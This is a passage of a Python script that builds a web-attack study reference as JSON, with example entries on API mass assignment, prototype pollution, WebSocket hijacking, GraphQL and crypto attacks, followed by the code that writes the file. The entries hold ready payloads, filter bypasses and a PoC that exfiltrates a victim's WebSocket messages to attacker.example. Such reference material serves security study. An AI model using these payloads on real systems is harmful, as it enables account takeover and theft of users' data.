"bypass": "Introspection disabled -> field-suggestion recovery (clairvoyance), or query via GET vs POST and alias-obfuscate to dodge a WAF.",
"automation": "  InQL (Burp), graphw00f (engine fingerprint), clairvoyance (schema without introspection), graphql-cop.",
},
"api-abuse": {
"overview": "example.com's PATCH /api/users/me ignores no fields. Adding `\"role\":\"admin\"` to the JSON body -- never sent by the UI -- sticks, escalating the account (mass assignment).",
"basic": "Read the spec, then over-post:\n  GET https://example.com/openapi.json ; PATCH /api/users/me {\"name\":\"x\",\"role\":\"admin\",\"verified\":true} -> check if the extra fields apply.",
"advanced": "Excessive data exposure:\n  GET https://example.com/api/users/1001 returns the full object (password hash, tokens) that the UI filters client-side; param-mine for hidden debug flags.",
"bypass": "Stripped field -> nest/alias it:\n  {\"user\":{\"role\":\"admin\"}}   or send it via an older /api/v1 endpoint that skips validation; switch JSON<->form encoding.",
"automation": "  arjun -u https://example.com/api/users/me (hidden params); import openapi.json into Burp/Postman to exercise every endpoint.",
},
"prototype-pollution": {
"overview": "example.com merges JSON into config recursively. Posting `{\"__proto__\":{\"isAdmin\":true}}` pollutes Object.prototype so every object inherits isAdmin -> auth/logic bypass (or DOM XSS client-side).",
"basic": "Send a pollution payload and check inheritance:\n  POST https://example.com/api/settings  {\"__proto__\":{\"polluted\":\"yes\"}}\n  then see if an unrelated object now has `polluted` (reflected/changed default).",
"advanced": "Server-side -> RCE gadget:\n  pollute a template/option default the app trusts (e.g. EJS) to inject code; client-side, pollute a property a DOM sink reads to get XSS.",
"bypass": "`__proto__` filtered -> use constructor:\n  {\"constructor\":{\"prototype\":{\"isAdmin\":true}}}   or nested  a[__proto__][b]=c.",
"automation": "  Burp DOM Invader (prototype-pollution mode) finds client-side sources+gadgets; Server-Side Prototype Pollution Scanner for the server side.",
},
"websockets": {
"overview": "example.com's chat WebSocket authenticates by cookie only with no Origin check. A page on attacker.example opens the socket as the victim (CSWSH) and reads/sends their messages.",
"basic": "Intercept and tamper messages (Burp WebSocket history):\n  {\"action\":\"read\",\"channel\":\"1001\"} -> try other channel/user ids (IDOR over the socket); inject payloads into message fields.",
"advanced": "CSWSH PoC on attacker.example:\n  var ws=new WebSocket('wss://example.com/chat'); ws.onmessage=e=>fetch('https://attacker.example/x?'+btoa(e.data));  (rides the victim's cookies).",
"bypass": "Origin check only blocks known-bad or substring-matches:\n  spoof Origin: https://example.com.attacker.example, or send Origin: null.",
"automation": "  Burp (WebSocket history + Repeater + WebSocket Turbo Intruder); wsrepl / wscat to script interaction.",
},
"crypto-failures": {
"overview": "example.com sends an HMAC'd token `data.H(secret||data)`. Because it uses raw SHA-256 (not HMAC), a length-extension attack forges a valid token (e.g. role=admin) without knowing the secret.",
"basic": "Assess transport + tokens:\n  testssl.sh example.com (weak protocols/ciphers, missing HSTS); inspect cookies/tokens for structure, low entropy, or clear-text secrets in URLs/logs.",
"advanced": "Padding-oracle decrypt (CBC) when the app reveals padding validity:\n  padbuster 'https://example.com/x?c=BASE64' BASE64 16 -cookies 'sid=...'  decrypts/forges ciphertext without the key.",
"bypass": "These attacks ARE the bypass: length-extension forges MACs, a padding oracle decrypts without the key, ECB cut-and-paste forges authenticated blobs, weak PRNG lets you predict 'unguessable' reset tokens.",
"automation": "  testssl.sh / sslscan (TLS); PadBuster / padding-oracle-attacker; hashcat / john (cracking); hash_extender (length extension).",
},
}


def build():
    modules = []
    for title, slug, secs in ATTACKS:
        ex = EXAMPLES.get(slug, {})
        sections = []
        for key, label in SECTIONS:
            content = secs.get(key, '').strip()
            example = (ex.get(key) or '').strip()
            if example:
                content = content + "\n\n**Example**\n" + example
            sections.append({'section': key, 'title': label, 'content': content})
        modules.append({'module': title, 'slug': slug, 'sections': sections})
    return {
        'metadata': {
            'source': 'Reconner Attack Reference',
            'structure': ['module', 'section'],
            'variant': 'summary',
            'note': 'Display-only knowledge base for the Wizard browser. '
                    'Attack type -> {overview, basic, advanced, bypass, automation}.',
        },
        'modules': modules,
    }


def main():
    data = build()
    here = os.path.dirname(os.path.abspath(__file__))
    repo_out = os.path.join(here, 'cwes_knowledge_base_summary.json')
    targets = [
        repo_out,
        os.path.expanduser('~/.wizard-ai/cwes_knowledge_base_summary.json'),
        os.path.expanduser('~/Documents/Study/CWES/cwes_knowledge_base_summary.json'),
    ]
    payload = json.dumps(data, indent=1, ensure_ascii=False)
    written = []
    for path in targets:
        d = os.path.dirname(path)
        if d and not os.path.isdir(d):
            # Only the repo dir is guaranteed; create the install dirs if missing.
            try:
                os.makedirs(d, exist_ok=True)
            except OSError:
                continue
        try:
            with open(path, 'w', encoding='utf-8') as f:
                f.write(payload + '\n')
            written.append(path)
        except OSError as e:
            print(f'!  could not write {path}: {e}')

    nsec = sum(len(m['sections']) for m in data['modules'])
    print(f'attack types: {len(data["modules"])}  |  sections: {nsec}')
    for p in written:
        print('  wrote', p)


if __name__ == '__main__':
    main()
